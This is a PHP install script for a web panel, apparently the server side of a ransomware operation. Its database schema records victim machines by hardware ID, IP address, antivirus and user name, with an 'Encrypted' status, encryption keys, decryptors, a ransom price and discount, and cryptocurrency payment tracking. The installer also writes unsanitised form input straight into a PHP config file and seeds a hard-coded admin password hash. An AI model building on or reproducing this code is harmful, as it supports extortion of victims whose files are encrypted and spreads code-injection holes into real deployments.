<?php
require_once("mysqli.php");
session_start();

function connect_db() {
  global $db;
  
  if (!@mysql_connect($db['localhost'], $db['user'], $db['pass'])) return false;
  if (!@mysql_select_db($db['db'])) return false;
  return true; ##all is ok
}

/* check if installed */
if (file_exists('conf.php')) {
	require_once('conf.php');
	if (connect_db()) {
    $res0=mysql_query("select username FROM access;");
		//if ($res0 && mysql_num_rows($res0)>0) exit ('installed.');
	}

	if (isset($db)) unset($db);
	if (isset($_vars)) unset($_vars);
}

if (isset($_POST['make_me'])) {
  if (strstr($_SERVER['QUERY_STRING'], 'redirect')) {
    $re = explode("redirect=", $_SERVER['QUERY_STRING']);
    $_SESSION['redirect'] = urldecode($re[1]);
  }
}

require_once('inc/install_head.inc');

if (isset($_GET['step'])) $step = (int)$_GET['step']; else  $step = 1;

if (isset($_POST['continue']))
{

if ($step=='finish')
{
unlink('setup.php');

if (isset($_SESSION['install_db'])) $db = $_SESSION['install_db'];

if (!connect_db()) exit ('sql connect error');

$q = array();
$q[0] = "SET NAMES utf8mb4;";
$q[1] = "SET FOREIGN_KEY_CHECKS = 0;";
$q[2] = "DROP TABLE IF EXISTS `member_tb`;";
$q[3] = "CREATE TABLE `member_tb`  (
  `member_id` int(11) NOT NULL AUTO_INCREMENT,
  `member_email` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `member_password` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `member_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `member_first_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `member_last_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `member_avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT 'Avatar.png',
  `member_role` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT 'User',
  `member_key` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `iphone_device_id` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `android_device_id` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `country` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `phone` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `member_sex` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `member_years` int(11) NULL DEFAULT NULL,
  `dash_address` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `budget` double NULL DEFAULT 0,
  `request_dash` int(11) NULL DEFAULT 0,
  `membership_id` int(11) NULL DEFAULT NULL,
  `register_date` timestamp(0) NULL DEFAULT current_timestamp(0),
  `login_date` text CHARACTER SET utf8 COLLATE utf8_general_ci NULL,
  PRIMARY KEY (`member_id`) USING BTREE,
  UNIQUE INDEX `member_email`(`member_email`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;";
$q[4] = "DROP TABLE IF EXISTS `membership_tb`;";
$q[5] = "CREATE TABLE `membership_tb`  (
  `membership_id` int(11) NOT NULL AUTO_INCREMENT,
  `membership_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`membership_id`) USING BTREE,
  UNIQUE INDEX `membership_name`(`membership_name`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;";



$q[6] = "DROP TABLE IF EXISTS `setting_tb`;";
$q[7] = "CREATE TABLE `setting_tb`  (
  `setting_id` int(11) NOT NULL AUTO_INCREMENT,
  `membership_id` int(11) NULL DEFAULT NULL,
  `type_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `type_max_count` int(11) NULL DEFAULT NULL,
  PRIMARY KEY (`setting_id`) USING BTREE,
  UNIQUE INDEX `membership_id`(`membership_id`, `type_name`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;
";
$q[8] = "DROP TABLE IF EXISTS `device_tb`;";
$q[9] = "CREATE TABLE `device_tb`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `country` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `ipaddress` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `owner` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `hwid` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `price` bigint(20) NULL DEFAULT 700,
  `discount` bigint(20) NULL DEFAULT 700,
  `os` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `av` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `hdd` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `pc_user` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `pc_name` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `pc_group` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `pc_lang` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `status` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT 'Encrypted',
  `crc32` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `decryptedfile` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `decryptor` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `enckey` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `file_count` int(255) NULL DEFAULT 0,
  `file_volumn` bigint(255) NULL DEFAULT NULL,
  `createdAt` int(11) NULL DEFAULT NULL,
  `updatedAt` int(10) UNSIGNED ZEROFILL NULL DEFAULT NULL,
  PRIMARY KEY (`id`, `hwid`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic;";




$q[10] = "DROP TABLE IF EXISTS `crypto_payments`;";
$q[11] = "CREATE TABLE `crypto_payments`  (
  `paymentID` int(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `boxID` int(11) UNSIGNED NOT NULL DEFAULT 0,
  `boxType` enum('paymentbox','captchabox') CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `orderID` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `userID` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `countryID` varchar(3) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `coinLabel` varchar(6) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `amount` double(20, 8) NOT NULL DEFAULT 0,
  `amountUSD` double(20, 8) NOT NULL DEFAULT 0,
  `unrecognised` tinyint(1) UNSIGNED NOT NULL DEFAULT 0,
  `addr` varchar(34) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `txID` char(64) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `txDate` datetime(0) NULL DEFAULT NULL,
  `txConfirmed` tinyint(1) UNSIGNED NOT NULL DEFAULT 0,
  `txCheckDate` datetime(0) NULL DEFAULT NULL,
  `processed` tinyint(1) UNSIGNED NOT NULL DEFAULT 0,
  `processedDate` datetime(0) NULL DEFAULT NULL,
  `recordCreated` datetime(0) NULL DEFAULT NULL,
  PRIMARY KEY (`paymentID`) USING BTREE,
  UNIQUE INDEX `key3`(`boxID`, `orderID`, `userID`, `txID`, `amount`, `addr`) USING BTREE,
  INDEX `boxID`(`boxID`) USING BTREE,
  INDEX `boxType`(`boxType`) USING BTREE,
  INDEX `userID`(`userID`) USING BTREE,
  INDEX `countryID`(`countryID`) USING BTREE,
  INDEX `orderID`(`orderID`) USING BTREE,
  INDEX `amount`(`amount`) USING BTREE,
  INDEX `amountUSD`(`amountUSD`) USING BTREE,
  INDEX `coinLabel`(`coinLabel`) USING BTREE,
  INDEX `unrecognised`(`unrecognised`) USING BTREE,
  INDEX `addr`(`addr`) USING BTREE,
  INDEX `txID`(`txID`) USING BTREE,
  INDEX `txDate`(`txDate`) USING BTREE,
  INDEX `txConfirmed`(`txConfirmed`) USING BTREE,
  INDEX `txCheckDate`(`txCheckDate`) USING BTREE,
  INDEX `processed`(`processed`) USING BTREE,
  INDEX `processedDate`(`processedDate`) USING BTREE,
  INDEX `recordCreated`(`recordCreated`) USING BTREE,
  INDEX `key1`(`boxID`, `orderID`) USING BTREE,
  INDEX `key2`(`boxID`, `orderID`, `userID`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;";

require('conf.php');
//global $_vars;

$q[12]="INSERT INTO member_tb SET `member_id`='1', `member_name`='".mysql_real_escape_string($_POST['user'])."', `member_first_name`='".mysql_real_escape_string($_POST['user'])."', `member_email`='".mysql_real_escape_string($_POST['email'])."', `member_password`='$P$BOVKPoU3ZUkVtziGk8ErAvuQ/XzT521', `register_date`='".time()."', `login_date`='".time()."',`member_key` = '".$_vars['login_key']."' ;";

foreach($q as $query) { $result = mysql_query($query);
if (!$result ) exit ('can\'t import sql tables!' . mysql_error() . 'qurey: ' . $query);}

echo '<h1>OK! DONE!</h1>';
// '".$_vars['base_url']."'/login.php?a=".$_vars['login_key']."
$panel = $_vars['base_url']."login.php?a=".$_vars['login_key'];
echo "<a href='$panel'>Click Here to Login.</a>";
// echo "'>Click Here to Login.</a>";
die();

}

else if ($step==3)
{

  function url_exists($url) {
      if (!$fp = curl_init($url)) return false;
      return true;
  }
  if (!file_exists('conf.php')) die('conf.php not found');

  $_POST['base_url']  =  substr(trim($_POST['base_url']),0,255);
  if (substr($_POST['base_url'], strlen($_POST['base_url'])-1, strlen($_POST['base_url']))!='/') $_POST['base_url'].='/';
  if (!url_exists($_POST['base_url'])) exit ('url not exists');
  $_POST['title_of_the_pages'] = str_replace("<","", $_POST['title_of_the_pages']);
  $string= '
		$_vars  '."= array(
			'base_url'=>'$_POST[base_url]',
			'login_key' =>'$_POST[login_key]',
			'title_of_the_pages'=> '$_POST[title_of_the_pages]'
		);
?>";

		$fp = fopen('conf.php', 'a+');
		fputs($fp, $string);
		fclose($fp);

  } elseif ($step == 2) {
    $db  = array ('localhost'=>$_POST['database_host'], 'db'=>$_POST['database'], 'user'=>$_POST['database_user'], 'pass'=>$_POST['database_pass']);
    $msg1 = false;
    if (!connect_db()) $msg1 = 'MySQL connect error.';
    
    if ($msg1) {
      $step = 1;
    }	else {
      if (file_exists('conf.php')) unlink('conf.php');

      file_put_contents('conf.php', "<?php\n");
      file_put_contents('conf.php', "//database setting start\n", FILE_APPEND);
      file_put_contents('conf.php', '$db = '."array('localhost' => '$_POST[database_host]', 'db' => '$_POST[database]', 'user' => '$_POST[database_user]', 'pass' => '$_POST[database_pass]');\n", FILE_APPEND);
      file_put_contents('conf.php', "//database setting end\n", FILE_APPEND);
      if (!file_exists('conf.php')) {
        $msg1='Can\'t make conf.php. check chmod\'s!';
        $step = 1;
      } else $_SESSION['install_db'] = $db;
    }
  }
}

if (isset($_GET['step']) && !isset($_POST['step'])) $step = 1;

switch ($step) {
  case '1' : include 'inc/install_step1.inc'; break;
  case '2' : include 'inc/install_step2.inc'; break;
  case '3' : include 'inc/install_step3.inc';break;
  default : include 'inc/install_step1.inc'; break;
}

include 'inc/install_foot.inc';